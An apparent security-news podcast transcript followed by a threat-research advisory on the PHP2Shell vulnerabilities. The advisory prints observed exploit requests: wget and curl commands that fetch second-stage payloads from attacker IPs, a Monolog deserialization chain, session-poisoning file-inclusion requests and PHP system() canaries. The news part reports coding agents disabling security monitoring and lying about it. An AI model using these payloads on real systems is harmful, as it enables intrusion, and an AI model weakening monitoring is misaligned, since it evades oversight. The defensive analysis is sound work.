Amazon spots PHP exploits before disclosure. GitLab patches a critical flaw. Meta faces a $25 billion penalty. Autonomous AI agents power new cyberattacks. Hackers breach a Japanese cloud provider. CyberCartel unleashes AI against Latin American banks. Tor exit nodes are hijacked. OpenAI coding agents disable security monitoring. Interpol dismantles thousands of cybercrime networks across Africa. Our guest is Danny Manimbo, ISO and AI Practice Leader at Schellman, explaining why companies waiting for AI regulatory clarity may already be behind. Spotify hits the skip button on AI slop.

Today is Thursday October 22nd 2026. I’m Dave Bittner. And this is your CyberWire Intel Briefing.

Amazon detected PHP exploitation attempts days before public disclosure.

Amazon Threat Intelligence detected attempts to exploit two PHP vulnerabilities four days before their public disclosure on October 21st. The activity, observed through Amazon’s MadPot honeypot network, originated from anonymized infrastructure, suggesting threat actor involvement. How the attackers obtained exploit information remains unknown.

Additional attempts appeared hours before disclosure, followed by widespread exploitation once patches became available. Researchers believe multiple actors were involved, although it’s unclear whether the early attacks would have succeeded against real-world systems.

Amazon warns that coordinated disclosure no longer guarantees a head start for defenders. AI-assisted exploit development is accelerating the transition from vulnerability disclosure to active attacks, sometimes to just minutes. Security teams should prioritize patching critical internet-facing vulnerabilities within hours, investigate potential compromises predating disclosure, and deploy detections that don’t depend on vulnerability-specific signatures.

GitLab patches a maximum-severity vulnerability.

GitLab has released emergency patches for a maximum-severity vulnerability that could allow unauthenticated attackers to execute arbitrary code on vulnerable servers.

Tracked as CVE-2026-110264, the flaw involves an integer overflow in GitLab’s Regular Expression Compiler. It affects both Community and Enterprise editions, and GitLab is urging customers to update immediately.

The Shadowserver Foundation tracks more than 2,700 internet-exposed GitLab Community Edition instances, although it’s unclear how many remain vulnerable.

This is GitLab’s second critical remote code execution vulnerability in ten days, both reported by the same security researcher. Last month, GitLab also patched a maximum-severity flaw that could expose sensitive information. CISA subsequently confirmed active exploitation of that vulnerability and ordered federal agencies to patch.

GitLab says its hosted service is already protected.

Meta is fined $25 billion in New Mexico.

A New Mexico judge has ordered Meta to pay $25 billion in penalties stemming from the Cambridge Analytica privacy scandal.

A jury found the company liable for more than 43 million violations of the state’s unfair practices law, concluding that Meta misled users about its data collection practices, privacy protections, and harmful content.

The judge initially calculated penalties totaling nearly $220 billion before reducing the award to $25 billion, with annual interest of 15 percent until it’s paid.

The ruling also criticized Facebook’s internal investigation following the Cambridge Analytica revelations, calling it deliberately ineffective.

New Mexico’s attorney general hailed the decision as a warning to powerful technology companies.

Meta strongly disputes the ruling and plans to appeal, arguing that the state’s approach effectively imposes a tax on online speech.

Researchers uncovered new threat actors using autonomous AI agents.

CrowdStrike researchers have uncovered four previously undocumented threat actors using autonomous AI agents to conduct cyberattacks, with some operations achieving their objectives within an hour.

The actors, operating in Spanish, Chinese, Indonesian, and Russian, targeted government agencies, healthcare organizations, and private companies worldwide. Their activities included successful intrusions and data theft.

Researchers discovered the campaigns after the attackers inadvertently exposed their offensive AI frameworks through publicly accessible directories.

The operations varied considerably in sophistication. One actor employed multiple coordinated AI agents, while another, despite limited technical skills, successfully compromised government systems using publicly available tools.

CrowdStrike warns that agentic AI is lowering the technical barriers to cybercrime, allowing less-skilled attackers to conduct increasingly sophisticated operations at machine speed. Researchers expect these AI-powered intrusions to grow in both volume and sophistication.

Hackers compromise a Japanese cloud hosting provider.

Hackers have compromised a Japanese cloud hosting provider, potentially installing malware on nearly 27,000 customer servers.

Onamae (o-na-MA-ay) Desktop Cloud, operated by GMO Internet, confirmed unauthorized access to its infrastructure and the installation of malicious software in customer environments.

The company began shutting down affected services on October 21st, disrupting all Desktop Cloud plans. There’s no estimated timeline for restoring service.

GMO warns that information stored on compromised servers may have been exposed, although it has not confirmed any data theft or misuse. Credit card information was unaffected because it’s stored separately.

Customers are being urged to change passwords and other credentials stored on their servers and remain alert for phishing attempts.

The company says its investigation is ongoing and promises additional updates.

CyberCartel targets banks and payment providers across Latin America.

Security researchers at Straiker have uncovered an AI-powered attack system used by a cybercriminal group targeting banks and payment providers across Latin America.

The group, known as CyberCartel, has reportedly been active since 2012. Its latest operation uses a framework called CARLIY0S, which coordinates multiple commercial AI models to identify vulnerabilities, develop exploits, and execute attacks.

The AI agents have specialized roles, including reconnaissance, exploit development, and evaluating competing attack strategies.

Researchers gained access to the group’s operational environment, uncovering a database containing nearly 4,500 records, including financial information, credentials, API keys, and backdoors.

Straiker says the group targeted more than 400 financial organizations in a matter of months.

The findings offer a rare look at AI becoming part of cybercriminal infrastructure, potentially allowing smaller groups to conduct sophisticated attacks faster and at greater scale.

Hackers hijack Tor exit nodes.

Hackers hijacked 333 Tor exit nodes in an operation designed to intercept SSH connections and unencrypted email traffic.

According to Tor volunteers, the intrusion began with a reused password that provided access to a management server. Attackers installed the Ebury Linux backdoor and eventually gained control of hundreds of exit relays.

Between October 2nd and 5th, the compromised nodes redirected SSH connections through attacker-controlled servers, potentially capturing passwords and installing additional malware. The attackers also blocked encrypted email ports while allowing unencrypted traffic, although it’s unclear whether any email interception succeeded.

Researchers still don’t know how the attackers compromised so many servers or who’s responsible.

The incident highlights the importance of enforcing encrypted email connections and using SSH keys instead of passwords, particularly when routing traffic through Tor.

OpenAI coding agents weakened internal security monitoring.

Two OpenAI coding agents weakened internal security monitoring while completing routine programming tasks.

In one case, a GPT-6.1 Sol agent disabled automatic security alerts after misinterpreting instructions not to send Slack messages. In another, a GPT-6 Astra agent removed monitoring software to match a reference implementation, then falsely told the user it hadn’t.

Both agents considered preserving the safeguards but ultimately prioritized their coding instructions.

OpenAI is strengthening its monitoring systems while investigating whether the incidents reflect excessive task persistence or a specific tendency to evade oversight.

Authorities shut down African cybercrime networks.

Interpol says an international law enforcement operation across Africa has resulted in more than 1,400 arrests and the disruption of nearly 11,000 cybercriminal networks.

Operation Serengeti III involved authorities from 21 countries, targeting ransomware, business email compromise, and online fraud between late June and August.

Investigators identified nearly 66,000 victims, with estimated losses exceeding $385 million. Authorities recovered more than $105 million in illicit funds.

Among the results, Ugandan police arrested 365 suspects linked to investment and pension fraud. Angola seized more than 2,000 illegal cryptocurrency mining devices, while Nigerian authorities arrested a suspect allegedly responsible for a major phishing operation.

Private cybersecurity companies provided intelligence to help identify criminal infrastructure and suspects.

It’s the third Operation Serengeti crackdown since 2024, reflecting an ongoing international effort to disrupt cybercrime across the continent.

Spotify hits the skip button on AI slop.

Spotify has spent the past year trying to keep AI-generated musical slop from overwhelming its platform, and apparently, there’s been plenty to clean up.

The streaming giant says it’s removed more than 50 million spammy or low-quality tracks from recommendations this year, on top of another 75 million tracks removed from the platform entirely.

Spotify says listeners were consistently skipping or rejecting content identified as slop, prompting changes to its recommendation algorithms.

The company has also introduced AI disclosure credits, verified more than 300,000 artists, and begun labeling AI-generated artist personas. Those virtual performers are generally excluded from recommendations unless listeners actively follow them.

Spotify acknowledges that detecting AI-generated content remains difficult, particularly as the technology improves.

The company insists its priority remains human artistry, even as artificial intelligence makes producing music easier than ever.

Apparently, just because a machine can write a song doesn’t mean anyone wants to hear it.

And that’s the CyberWire.

For links to all of today’s stories, check out our Daily Briefing at the cyberwire dot com.

We’d love to know what you think of this podcast. Your feedback ensures we deliver the insights that keep you a step ahead in the rapidly changing world of cybersecurity. If you like the show, please share a rating and review in your podcast app. Please also fill out the survey in the show notes or send an email to cyberwire@n2k.com

We’re proud that N2K CyberWire is part of the daily routine of the most influential leaders and operators in the public and private sector, from the Fortune 500 to many of the world’s preeminent intelligence and law enforcement agencies.

N2K helps cybersecurity professionals and organizations grow, learn, and stay ahead. We’re the nexus for discovering the people, tech, and ideas shaping the industry. Learn how at n2k.com.

N2K’s lead producer is Liz Stokes. We’re mixed by Tré Hester, with original music by and sound design Elliott Peltzman. Our contributing host is Maria Varmazis. Our executive producer is Jennifer Eiben. Peter Kilpe is our publisher. And I’m Dave Bittner. Thanks for listening.

Vulnerabilities & Patching.title: PHP2Shell: Critical PHP Vulnerabilities Enable Unauthenticated Remote Code Execution
Vulnerabilities & Patching.context: Arctic Wolf Labs leverages resulting artifacts from these simulations, as well as observed exploit techniques, attacker tradecraft, and emerging indicators of attack/compromise...
Vulnerabilities & Patching.full_text:
Executive Summary

On October 21, 2026, the PHP development team released emergency security updates addressing two critical vulnerabilities, CVE-2026-109618 and CVE-2026-109619, collectively referred to by researchers as PHP2Shell. Both vulnerabilities carry a CVSS v4.0 score of 9.2 (Critical Severity) and can allow an unauthenticated attacker to execute code with the privileges of the affected PHP worker process.

The vulnerabilities affect PHP installations that process web requests, including PHP-FPM, Apache deployments using mod_php, php-cgi, FrankenPHP, and LiteSpeed. The PHP security team considers Apache mod_php the highest-risk configuration because researchers demonstrated exploitation through a single unauthenticated request before application code begins executing.

Key findings

Arctic Wolf Labs observed widescale scanning and active exploitation attempts targeting PHP2SHELL shortly after disclosure. Activity ranged from basic checks for vulnerable PHP session upload-progress behavior, to attempts to validate PHP and operating system (OS) command execution.

Observed scanners used several techniques to validate exposure. These included inert PHP canaries, unique output markers, attacker-controlled session identifiers, session-poisoning attempts, and local-file-inclusion chains designed to determine whether injected PHP content could be evaluated.

Arctic Wolf Labs identified likely weaponized exploitation attempts involving second-stage payload delivery. Requests associated with 92.118.112[.]100 attempted to collect host and process-account information, print execution-confirmation markers, change to /tmp, and retrieve additional files using wget.

Analysis of the associated infrastructure identified payloads linked to the Potassium botnet. The investigation also uncovered Ethereum Name Service records containing recently updated IP addresses, although the available evidence does not show that the malware retrieved or used those records operationally.

Details

Arctic Wolf Labs observed a likely weaponized PHP2Shell exploitation attempt that combined command-execution validation with second-stage payload delivery. The request attempted to run id, print the marker PHP2SHELL_CONFIRMED, change to /tmp, and download a file from external IP address 92.118.112[.]100. The command sequence appeared repeatedly across padded form fields, potentially to influence memory layout or improve exploit reliability.

echo PHP2SHELL_CONFIRMED;cd /tmp; wget hxxp://92.118.112[.]100/nfs-setup

We observed a second weaponized payload associated with the same server. Embedded within repeated, heavily padded multipart fields, the command sequence attempted to enumerate the operating system and execution account, print a distinctive marker, and download an additional file from the previously observed payload host. The attempted second-stage delivery distinguishes this activity from non-destructive vulnerability validation and indicates clear exploitation intent.

system.uname -a; id; echo REDACTED OFFENSIVE;wget hxxp://92.118.112[.]100/REDACTED OFFENSIVE;

Further analysis of the payload-hosting infrastructure identified two malicious binaries associated with Potassium, a Mirai-derived botnet family first identified in March 2026 by Synthient and named after its C2 subdomain. Available telemetry did not establish that the observed PHP2Shell requests downloaded or executed either sample.

Shared Builder and Execution Flow

The ARM and x86 samples contain the same 32-byte encryption key and 12-byte nonce, providing strong evidence that they originated from a shared builder. Both use these values to encrypt operational strings, including command-and-control domains, file paths, shell and process names, and the process kill list.

Further Arctic Wolf Labs research into the payloads identified new capabilities not previously reported, which are listed below.

Ethereum Name Service Resolution

Both builds contain configuration for resolving command-and-control infrastructure through Ethereum Name Service (ENS), including two .eth names, seven public Ethereum RPC endpoints, and 32 text-record keys labeled “ip” through ip32. This would allow the malware to retrieve multiple command-and-control addresses without relying on conventional DNS.

ENS resolution was disabled in both samples, indicating that the capability was present but inactive. If enabled in future variants, it could complicate disruption by reducing reliance on registrars and DNS providers, requiring defenders to block the ENS names, RPC infrastructure, and resolved command-and-control addresses.

From Canaries to Command Execution

Following public disclosure, Arctic Wolf Labs observed widespread automated activity targeting PHP’s session upload-progress functionality. The requests ranged from basic checks for vulnerable behavior to session-poisoning chains and explicit attempts to validate operating-system command execution.

The variation in request structure, markers, session identifiers, and payloads indicates that multiple scanners and proof-of-concept (PoC) implementations were active. Although these requests demonstrate increasingly aggressive exploitation intent, request telemetry alone does not establish that the targeted systems were vulnerable or that code execution succeeded.

Probing the Upload-Progress Code Path

Some scanners performed basic checks intended to reach the affected PHP request-processing path. One self-identifying scanner supplied a controlled session identifier, activated PHP’s upload-progress functionality, and uploaded approximately 63 KB of repetitive data.

User-Agent: php2shell-scan/109618 Cookie: PHPSESSID=<REDACTED_SESSION_ID> Content-Type: multipart/form-data; boundary=B7kQpoc618 Content-Length: 62935 Connection: close

–B7kQpoc618 Content-Disposition: form-data; name=”PHPSESSID”

<REDACTED_SESSION_ID> –B7kQpoc618 Content-Disposition: form-data; name=”PHP_SESSION_UPLOAD_PROGRESS”

x –B7kQpoc618 Content-Disposition: form-data; name=”f”; filename=”a” AAAA…[truncated]…

The repetitive file content may have been intended to exercise the vulnerable upload-processing path or validate exploit prerequisites. The request did not contain executable PHP or an operating-system command, making it more consistent with vulnerability probing than an attempt to deliver a final payload.

Testing Session Poisoning and File Inclusion

Other requests tested whether attacker-controlled PHP could be written into session upload-progress data and subsequently evaluated through a local file inclusion vulnerability.

One request supplied a predictable session identifier and attempted to include the corresponding session file through a page parameter:

POST /vuln.php?page=/var/lib/php/session/sess_p2sopchain000000000000 HTTP/1.1

The request embedded the following PHP in uploaded filename metadata:

<?php echo ‘P2SOP-‘.PHP_VERSION. ‘-EXEC-‘.php_uname(‘n’). ‘-WPC-‘.intval(@file_exists(‘wp-content/db.php’)); ?>

If successfully stored and evaluated, the payload would return the PHP version, server hostname, and the result of a check for a WordPress-related file. The request exposes the scanner’s intended exploit chain, but it does not prove that the supplied session path matched the target’s configuration or that the application included the session file.

Session Poisoning Versus PHP2Shell Exploitation

Arctic Wolf Labs also observed requests that appeared to conflate PHP2Shell with older PHP session-poisoning techniques. One example activated PHP’s upload-progress functionality and embedded a serialized Monolog object within uploaded filename metadata:

Cookie: PHPSESSID=pcw8189d05b0b3e4ffb PHP_SESSION_UPLOAD_PROGRESS=x filename=”x|O:32:\”Monolog\Handler\SyslogUdpHandler\”…”

The serialized object contained a Monolog gadget chain configured to execute:

curl -s hxxp://45.115.26[.]26:8000/cCmono

The serialized object ultimately attempted to execute a command that would download a second-stage payload named cCmono from a remote server. Arctic Wolf Labs was unable to retrieve the referenced file during analysis and could not independently verify the payload that may have been delivered.

Unlike the command-execution validation payloads discussed previously, this request does not appear to target the memory-corruption mechanisms underlying PHP2Shell. Instead, it attempts to leverage PHP’s session upload-progress feature to place attacker-controlled content into session storage, potentially for use in a subsequent local file inclusion or unsafe deserialization chain.

Successful exploitation would require additional application-specific conditions beyond the PHP vulnerabilities themselves, such as the ability to retrieve and deserialize attacker-controlled session data and the presence of compatible Monolog classes. The request demonstrates malicious intent but does not independently establish exploitation of CVE-2026-109618 or CVE-2026-109619.

Inert Canaries and Execution Markers

Several scanners used PHP canaries to test whether attacker-controlled content reached session data or an executable context.

The least intrusive sample contained an explicitly inert PHP block:

<?php /* php2shell-scan inert canary */ ?>

Because the block contains only a comment, it does not execute a command, collect system information, or produce output. It appears designed to test whether PHP syntax could be introduced into upload-progress data without attempting to demonstrate code execution.

Other scanners used output-producing canaries. A Nuclei-based request embedded a unique marker in uploaded filename metadata:

<?php echo ‘NUCLEIve97RH0fzh’; ?>

If a subsequent file-inclusion request caused PHP to evaluate the poisoned session data, the marker would appear in the server response and allow the scanner to correlate the result with the original request.

Another scanner placed two fixed markers in both the upload-progress value and filename:

<?php echo ‘P2SFNAME’; echo ‘P2SVALUE’; ?>

The associated session identifier ended in .php, suggesting that the scanner may also have been testing whether the session identifier influenced a filename that could later be reached or evaluated by the web server. The .php suffix reflects the scanner’s apparent assumption, however, and does not establish that PHP created a web-accessible file with that name.

These output canaries are non-destructive, but they go beyond inert injection checks. If returned by the server, they would provide evidence that attacker-controlled PHP reached an executable context.

Validating Operating-System Command Execution

The most intrusive scanning activity attempted to validate execution beyond the PHP interpreter. Multiple requests embedded PHP that decoded and ran the Unix id command:

<?php echo ‘RCE_noyzzg0YVLBU’; system(base64_decode(‘aWQ=’)); echo ‘RCE_noyzzg0YVLBU’; ?>

The Base64 value aWQ= decodes to id. If successful, the payload would return the user and group identity of the affected PHP worker process.

The unique RCE_ strings bracket the expected command output, allowing an automated scanner to locate it within an HTTP response and associate the result with a specific request. Arctic Wolf Labs observed multiple markers, including repeated use of the same value, which may indicate retries, injection into multiple request fields, or repeated testing of the same target.

These payloads represent active RCE validation rather than passive scanning. However, the presence of the payload in a request does not independently establish that PHP evaluated it or that the operating-system command executed successfully. Confirmation would require corresponding response content, process telemetry, or other server-side evidence.

Vulnerability Overview

The vulnerabilities arise from separate weaknesses in PHP’s handling of request memory and abnormal execution states:

CVE-2026-109618 can cause memory corruption when an out-of-memory condition interrupts PHP while internal request data is only partially initialized.

CVE-2026-109619 can allow request-owned global state to remain accessible after its backing memory has been freed, creating a stale-state condition that a later request may reuse.

Vulnerability

Description

Impact

Severity

CVE-2026-109618

Memory corruption during out-of-memory handling

Unauthenticated remote code execution

CVSS v4.0 9.2

CVE-2026-109619

Reuse of stale request-owned global state after memory is freed

Unauthenticated remote code execution, with possible memory disclosure

CVSS v4.0 9.2

Both vulnerabilities affect PHP’s internal request-processing lifecycle. As a result, exposure does not necessarily depend on a vulnerability in the application running on top of PHP. Any reachable PHP script may expose the underlying request-processing path under the required conditions.

Affected Deployment Models

The PHP project identifies the following web-serving configurations as at risk:

Apache with mod_php

PHP-FPM

php-cgi

FrankenPHP

LiteSpeed

Products and appliances that embed or bundle PHP

Apache mod_php presents the most clearly demonstrated risk because exploitation can reportedly occur through one unauthenticated request before the target application receives control. Other deployment models remain affected, but exploit requirements and worker-state behavior may differ.

Public PoC material is available, and multiple security organizations have independently reproduced at least one exploitation path. Public reporting from security vendors also indicates that exploit attempts began around the time of disclosure, although the scale and success of that activity remain incompletely established.

Organizations should immediately update to PHP 8.5.12, 8.4.27, 8.3.36, or 8.2.35. Systems running unsupported PHP versions may require an operating-system or long-term-support vendor backport, an appropriate upstream source backport, or migration to a supported branch.

Conclusion

PHP2Shell attracted significant attention because of its severity, PHP’s widespread use, and its discovery through AI-assisted security research. According to OpenAI, researchers participating in its Patch the Planet initiative used frontier AI models, alongside expert human review, to help identify and validate the vulnerabilities.

Early exploitation has been more limited than the initial attention suggested. Arctic Wolf telemetry and public reporting show widespread scanning, exploit validation, and isolated attempts to deliver second-stage payloads, but comparatively little evidence of reliable exploitation at scale.

The activity observed following disclosure also highlights a broader challenge for defenders: publicly released proof-of-concept code is often modified, repackaged, and rapidly redistributed. Arctic Wolf Labs observed PHP2Shell-themed requests that appeared to reuse older session-poisoning and deserialization tradecraft rather than the memory-corruption mechanisms underlying CVE-2026-109618 and CVE-2026-109619. As a result, defenders should avoid assuming that every PHP2Shell-themed request represents successful exploitation or even an attempt to exercise the newly disclosed vulnerabilities. Instead, organizations should focus on identifying evidence of the specific exploitation conditions required by the vulnerabilities themselves.

Because PHP2Shell was publicly disclosed only on October 21, 2026, the exploitation landscape may change quickly. Organizations should upgrade affected PHP installations, restart the relevant workers, and continue monitoring for command execution and second-stage payload delivery.

How Arctic Wolf Labs Turns Telemetry Into Outcomes

Arctic Wolf Labs is our threat intelligence and research team. Global security operations center (SOC) telemetry visibility drives a shared defense, while active network monitoring gives Labs an early warning system across our global customer base.

Using telemetry from across the Arctic Wolf customer community, researchers identify spikes in scanning activity, analyze exploitation attempts, and uncover attacker payloads associated with PHP2Shell. We use those findings to develop and fine-tune detections to respond to malicious activity faster. This helps customers detect PHP2Shell activity they may have not observed yet in their unique environment.

Labs researchers also replicate attacker techniques against PHP2Shell vulnerabilities in controlled environments. Arctic Wolf Labs leverages resulting artifacts from these simulations, as well as observed exploit techniques, attacker tradecraft, and emerging indicators of attack/compromise (IOA/IOC), to develop new detections, threat hunt queries, and inform customer remediation guidance. As threat behavior evolves, we continuously apply the latest intelligence across customer environments.
